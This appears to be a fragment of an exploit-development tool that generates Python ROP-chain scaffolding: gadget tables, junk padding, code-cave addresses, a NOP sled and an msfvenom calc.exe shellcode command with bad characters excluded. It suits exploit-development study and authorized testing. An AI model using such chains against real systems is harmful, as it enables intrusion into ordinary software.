  const slot = slotBlock(api, input.module, input.iatSlot, badchars, input.delta);
  return {
    table,
    stages,
    holes: slot.hole ? [slot.hole, ...holes] : holes,
    recipes,
    blocks: {
      1: HELPER_BLOCK,
      2: slot.block,
      3: CORPUS_BLOCK,
      4: { lines: [
        ...table.flatMap((entry) => [
          `${entry.name.padEnd(width)} = ${hex(entry.address)}   # ${entry.sequence}${warnings[entry.address] ? `   <<< ${warnings[entry.address]}`
            : byAddress[entry.address] && far(byAddress[entry.address]) ? `   <<< takes 0x${(stackMove(byAddress[entry.address]) ?? 0).toString(16)} bytes of stack: c.rop pads that much junk into the payload` : ""}`,
          ...swapsFor(entry.address, entry.loads).map((swap) =>
            `# ${entry.name.padEnd(width - 2)} = ${hex(swap.address)}   # ${swap.sequence}   drop-in swap, ranked lower: ${swap.why}`),
        ]),
        `COST = {${[
          ...cost.map((entry) => `${entry.name}: (${entry.pops}, ${entry.retn ? `0x${entry.retn.toString(16)}` : 0})`),
          ...table.flatMap((entry) => swapsFor(entry.address, entry.loads)
            .filter((swap) => swap.pops > 0 || swap.retn > 0)
            .map((swap) => `${hex(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`)),
        ].join(", ")}}     # (extra pops, ret N). The swap-ins are here too, so swapping one in needs no other edit.`,
        "",
        "class Chain(list):                # c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for its extra pops",
        "    skip, patches = 0, None",
        "    def rop(self, gadget, *values):",
        "        pops, retn = COST.get(gadget, (0, 0))",
        "        self.extend([gadget] + [0x41414141] * (self.skip // 4) + list(values) + [0x41414141] * pops)",
        "        self.skip, self.patches = retn, self.patches or []",
      ] },
      5: { lines: [
        ...(input.writable !== undefined ? [`WRITABLE = ${hex(input.writable)}     # writable dword, code_caves STAGING`] : []),
        ...(input.cave !== undefined ? [`CAVE = ${hex(input.cave)}     # executable cave, code_caves EXEC`] : []),
        ...loaderLines,
      ] },
      6: { lines: frameBlock },
      7: { lines: [
        `def payload${nextStage()}():`,
        ...[
          "nops = b\"\\x90\" * 16",
          ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
          ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
          "c = Chain()",
          ...render(chain, ""),
          "return payload",
        ].map((line) => (line === "" ? "" : `    ${line}`)),
      ] },
    },
  };
}
